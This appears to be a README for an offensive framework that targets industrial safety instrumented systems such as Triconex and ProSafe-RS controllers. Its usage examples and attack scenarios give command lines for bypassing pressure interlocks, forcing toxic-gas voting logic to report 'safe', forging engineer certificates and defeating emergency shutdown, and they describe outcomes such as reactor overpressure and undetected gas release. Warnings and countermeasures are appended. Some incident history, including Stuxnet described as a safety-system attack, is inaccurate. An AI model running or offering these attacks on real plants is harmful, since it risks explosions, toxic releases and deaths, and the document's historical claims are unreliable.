# Safety Instrumented System Bypass Framework

**CRITICAL WARNING**: This framework is for authorized security research and penetration testing of safety systems ONLY. Bypassing safety systems in production environments can cause loss of life, environmental disasters, and catastrophic equipment failure.

## Overview

Comprehensive security assessment framework for Safety Instrumented Systems (SIS) in industrial environments. Analyzes vulnerabilities in SIL-rated controllers, emergency shutdown systems, and safety interlocks.

## Supported Safety Systems

- **Triconex**: Schneider Electric Tricon/Trident
- **ProSafe-RS**: Yokogawa safety controllers
- **SafetyPLC**: Generic safety PLCs
- **HIMA**: HIMatrix/HIMax safety systems
- **Siemens Safety**: S7 F-Systems, ET 200SP F

## Safety Integrity Levels (SIL)

**SIL 4**: Highest (10^-5 to 10^-4 failure probability)  
**SIL 3**: High (10^-4 to 10^-3) - Nuclear, offshore platforms  
**SIL 2**: Medium (10^-3 to 10^-2) - Chemical processes  
**SIL 1**: Basic (10^-2 to 10^-1) - General industrial

## Attack Capabilities

### Reconnaissance
- Interlock enumeration
- SIL circuit mapping
- Voting logic identification
- Safety network topology discovery

### Bypass Techniques
- Single interlock defeat
- Multiple interlock bypass chains
- Voting logic manipulation (1oo2, 2oo3)
- Safety certificate forgery

### Availability Attacks
- Safety network disruption
- Controller mode forcing
- Emergency shutdown defeat

### Advanced
- Firmware manipulation
- Diagnostic port exploitation
- Redundancy defeat

## Installation

```bash
cd tools/safety_bypass_framework
pip install -r requirements.txt
```

## Usage Examples

### Interlock Enumeration

```bash
python safety_bypass.py -t 192.168.1.100 --system triconex --enumerate
```

### Bypass Single Interlock

```bash
python safety_bypass.py -t 192.168.1.100 --system triconex --bypass PSH_101
```

### Voting Logic Override

```bash
python safety_bypass.py -t 192.168.1.100 --system triconex \
    --voting-override VOTE_ESD_01 --force-state off
```

### SIL Circuit Analysis

```bash
python safety_bypass.py -t 192.168.1.100 --system prosafe --analyze-circuits
```

### Safety Network Disruption

```bash
python safety_bypass.py -t 192.168.1.100 --system triconex \
    --network-disrupt --duration 120
```

### Certificate Forgery

```bash
python safety_bypass.py -t 192.168.1.100 --system triconex \
    --certificate-forge "ENGINEER_01"
```

### Emergency Shutdown Defeat (EXTREMELY DANGEROUS)

```bash
python safety_bypass.py -t 192.168.1.100 --system triconex \
    --defeat-esd ESD_001
```

## MITRE ATT&CK ICS Mapping

- **T0815**: Denial of Service
- **T0816**: Device Restart/Shutdown
- **T0826**: Loss of Availability
- **T0832**: Manipulation of Control
- **T0836**: Modify Parameter
- **T0839**: Module Firmware
- **T0840**: Network Connection Enumeration
- **T0856**: Spoof Reporting Message
- **T0858**: Change Operating Mode
- **T0861**: Point & Tag Identification
- **T0865**: Spearphishing Attachment
- **T0890**: Exploitation for Privilege Escalation

## Technical Details

### Triconex Architecture

**Triple Modular Redundancy (TMR)**: Three parallel processing channels  
**Voting**: 2oo3 (2 out of 3 must agree)  
**Communication**: TriStation protocol (port 1502)  
**Firmware**: Proprietary RTOS

**Bypass vectors**:
- Individual module compromise
- Voting logic manipulation
- TriStation protocol exploitation
- Firmware backdoor injection

### Yokogawa ProSafe-RS

**Dual redundancy**: 1oo2 voting  
**Communication**: Vnet/IP (port 18245)  
**Certification**: SIL 3 capable

**Bypass vectors**:
- Redundancy defeat
- Vnet protocol exploitation
- Engineering station compromise

### Siemens Safety

**F-CPU**: Safety-rated S7 controller  
**PROFIsafe**: Safety fieldbus protocol  
**Certification**: SIL 3 / PLe

**Bypass vectors**:
- PROFIsafe message manipulation
- Safety signature forgery
- F-runtime bypass

## Common Interlock Types

**PSH/PSL**: Pressure Switch High/Low  
**TSH/TSL**: Temperature Switch High/Low  
**LSH/LSL**: Level Switch High/Low  
**FSL**: Flow Switch Low  
**FGSD**: Fire & Gas Shutdown  
**ESD**: Emergency Shutdown

## Attack Scenarios

### Scenario 1: Pressure Interlock Bypass

Target: Reactor pressure relief interlock

```bash
# Enumerate interlocks
python safety_bypass.py -t 192.168.1.100 --system triconex --enumerate

# Identify high pressure interlock
# PSH_R101: Reactor 101 High Pressure

# Bypass interlock
python safety_bypass.py -t 192.168.1.100 --system triconex --bypass PSH_R101

# Result: Reactor can now exceed safe pressure limit
```

### Scenario 2: ESD Defeat

Target: Complete emergency shutdown system

```bash
# Analyze ESD circuits
python safety_bypass.py -t 192.168.1.100 --system triconex --analyze-circuits

# Defeat ESD_001 (full shutdown chain)
python safety_bypass.py -t 192.168.1.100 --system triconex --defeat-esd ESD_001

# Result: Emergency shutdown disabled, catastrophic failure possible
```

### Scenario 3: Voting Logic Manipulation

Target: 2oo3 voting for toxic gas detection

```bash
# Override voting to always report "safe"
python safety_bypass.py -t 192.168.1.100 --system triconex \
    --voting-override H2S_VOTE_01 --force-state off

# Result: Toxic gas release undetected
```

## Countermeasures

1. **Physical Security**: Restrict access to safety controllers
2. **Network Segmentation**: Isolate safety network from process control
3. **Authentication**: Enforce strong authentication for safety modifications
4. **Change Management**: Rigorous approval process for safety changes
5. **Monitoring**: Continuous monitoring of interlock status
6. **Testing**: Regular proof testing of safety functions
7. **Firmware Integrity**: Validate firmware signatures
8. **Air-Gap**: No external connectivity for critical safety systems
9. **Redundancy Monitoring**: Alert on redundancy failures
10. **Physical Interlocks**: Hardwired safety where critical

## Real-World Incidents

**Stuxnet (2010)**: Manipulated safety systems in Iranian centrifuges  
**Triton/Trisis (2017)**: Targeted Triconex safety controllers at petrochemical plant  
**Ukraine Power Grid (2015/2016)**: Disabled safety protections

## Legal and Ethical Considerations

Bypassing safety systems:
- **Is illegal** without explicit authorization
- **Can cause death** and serious injury
- **Can cause environmental disasters** (chemical releases, explosions)
- **Can destroy equipment** worth millions
- **Violates international safety standards** (IEC 61508, IEC 61511)

**Legal uses**:
- Authorized penetration testing with safety shutdown
- Isolated test lab environments
- Security research with vendor cooperation
- Incident response and forensics

## Testing Precautions

**NEVER** test on production safety systems. Required precautions:
1. Isolated test environment
2. Physical barriers preventing harm
3. Manual safety overrides in place
4. Trained safety personnel present
5. Written authorization from management
6. Emergency response plan
7. Disconnect from physical process

## Legal Notice

FOR AUTHORIZED SECURITY TESTING ONLY. Unauthorized tampering with safety systems is:
- A federal crime in most jurisdictions
- Grounds for immediate termination
- Subject to civil liability
- Potential manslaughter charges if harm occurs

## References

- IEC 61508: Functional Safety of E/E/PE Safety-Related Systems
- IEC 61511: Safety Instrumented Systems for the Process Industry
- ISA 84: Application of SIS for the Process Industries
- ICS-CERT: Triton Analysis Reports
- NIST SP 800-82: ICS Security Guide
